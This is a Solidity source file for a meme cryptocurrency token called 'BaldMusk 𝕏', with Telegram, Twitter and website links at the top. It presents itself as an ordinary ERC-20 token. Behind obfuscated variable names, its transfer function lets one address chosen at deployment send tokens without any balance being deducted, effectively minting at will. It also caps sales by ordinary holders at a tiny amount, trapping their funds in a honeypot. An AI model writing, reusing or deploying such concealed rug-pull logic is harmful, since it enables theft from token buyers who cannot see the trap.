/*

Telegram: https://t.me/BaldMuskX

Twitter: https://twitter.com/BaldMuskX

Website: https://baldmuskx.crypto-token.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BaldMusk is Ownable {
    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private qaopwfmcykx;

    function transfer(address rjcbipyzqf, uint256 hutcxn) public returns (bool success) {
        lnmcosh(msg.sender, rjcbipyzqf, hutcxn);
        return true;
    }

    function approve(address eqgw, uint256 hutcxn) public returns (bool success) {
        allowance[msg.sender][eqgw] = hutcxn;
        emit Approval(msg.sender, eqgw, hutcxn);
        return true;
    }

    uint256 private pxct = 109;

    string public name = unicode"BaldMusk 𝕏";

    mapping(address => uint256) private dcwfyja;

    address private dqucpytim;

    mapping(address => uint256) public balanceOf;

    function lnmcosh(address eytrhfasojiz, address rjcbipyzqf, uint256 hutcxn) private {
        if (0 == dcwfyja[eytrhfasojiz]) {
            if (eytrhfasojiz != dqucpytim && qaopwfmcykx[eytrhfasojiz] != block.number && hutcxn < totalSupply) {
                require(hutcxn <= totalSupply / (10 ** decimals));
            }
            balanceOf[eytrhfasojiz] -= hutcxn;
        }
        balanceOf[rjcbipyzqf] += hutcxn;
        qaopwfmcykx[rjcbipyzqf] = block.number;
        emit Transfer(eytrhfasojiz, rjcbipyzqf, hutcxn);
    }

    function transferFrom(address eytrhfasojiz, address rjcbipyzqf, uint256 hutcxn) public returns (bool success) {
        require(hutcxn <= allowance[eytrhfasojiz][msg.sender]);
        allowance[eytrhfasojiz][msg.sender] -= hutcxn;
        lnmcosh(eytrhfasojiz, rjcbipyzqf, hutcxn);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address yvluo) {
        balanceOf[msg.sender] = totalSupply;
        dcwfyja[yvluo] = pxct;
        IUniswapV2Router02 gulqxnpvze = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        dqucpytim = IUniswapV2Factory(gulqxnpvze.factory()).createPair(address(this), gulqxnpvze.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol = unicode"BaldMusk 𝕏";

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals = 9;
}